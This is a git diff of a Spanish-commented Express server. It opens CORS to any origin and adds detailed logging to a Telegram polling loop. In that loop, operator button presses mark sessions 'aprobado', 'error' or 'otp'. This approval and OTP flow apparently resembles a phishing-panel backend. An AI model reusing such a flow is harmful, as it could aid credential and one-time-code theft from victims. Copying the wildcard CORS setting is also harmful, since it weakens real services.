@@ -71,13 +71,17 @@ async function enviarATelegram(mensaje, botones = null) {
 // Permitir peticiones desde cualquier origen (necesario para Azure + Render)
 // DEBE estar al inicio, ANTES de express.json() y otros middlewares
 app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+  res.set('Access-Control-Allow-Origin', '*');
+  res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD');
+  res.set('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Access-Control-Allow-Origin');
+  res.set('Access-Control-Max-Age', '3600');
 
-  // Responder a preflight requests
+  console.log(`📨 ${req.method} ${req.path} - CORS habilitado`);
+
+  // Responder a preflight requests OPTIONS
   if (req.method === 'OPTIONS') {
-    return res.sendStatus(200);
+    console.log(`✅ Preflight OPTIONS respondido para ${req.path}`);
+    return res.status(200).end();
   }
 
   next();
@@ -372,9 +376,16 @@ app.post('/api/telegram/accion', async (req, res) => {
 // ===== POLLING DE TELEGRAM =====
 // Consultar actualizaciones de Telegram sin necesidad de webhook
 let lastUpdateId = 0;
+let pollingActivo = false;
 
 async function pollingTelegram() {
-  if (!telegramConfigurado()) return;
+  if (!telegramConfigurado()) {
+    if (!pollingActivo) {
+      console.log('⚠️ Telegram NO configurado - polling desactivado');
+      pollingActivo = true;
+    }
+    return;
+  }
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
@@ -389,12 +400,12 @@ async function pollingTelegram() {
     const data = await response.json();
 
     if (!data.ok) {
-      console.error('⚠️ Error en getUpdates:', data.description);
+      console.error('❌ Error en getUpdates de Telegram:', data.description);
       return;
     }
 
     if (data.result && data.result.length > 0) {
-      console.log(`📬 ${data.result.length} update(s) de Telegram`);
+      console.log(`📬 ${data.result.length} update(s) de Telegram detectado(s)`);
 
       for (const update of data.result) {
         lastUpdateId = update.update_id;
@@ -403,15 +414,22 @@ async function pollingTelegram() {
         if (update.callback_query) {
           const { id: callback_query_id, data: callbackData, from, message } = update.callback_query;
 
-          console.log(`📱 Botón presionado:`, { callbackData, usuario: from.username || from.first_name });
+          console.log(`\n🔔 ========== CALLBACK TELEGRAM ==========`);
+          console.log(`📱 Botón presionado por: ${from.username || from.first_name} (ID: ${from.id})`);
+          console.log(`📍 CallbackData: ${callbackData}`);
+          console.log(`💬 Mensaje ID: ${message.message_id}`);
 
           // Parsear callback_data: formato "accion_ACCION_SESSION_ID"
           const partes = callbackData.split('_');
+          console.log(`🔍 Parseando: partes=${JSON.stringify(partes)}, length=${partes.length}`);
+
           if (partes[0] === 'accion' && partes.length >= 3) {
             const accion = partes[1]; // aprobado, error, otp
             const session_id = partes.slice(2).join('_');
 
-            console.log(`🎯 Procesando acción: ${accion} para sesión: ${session_id}`);
+            console.log(`✨ Acción válida detectada:`);
+            console.log(`   - Tipo: ${accion}`);
+            console.log(`   - Session ID: ${session_id}`);
 
             // Actualizar sesión si existe
             if (sesiones.has(session_id)) {
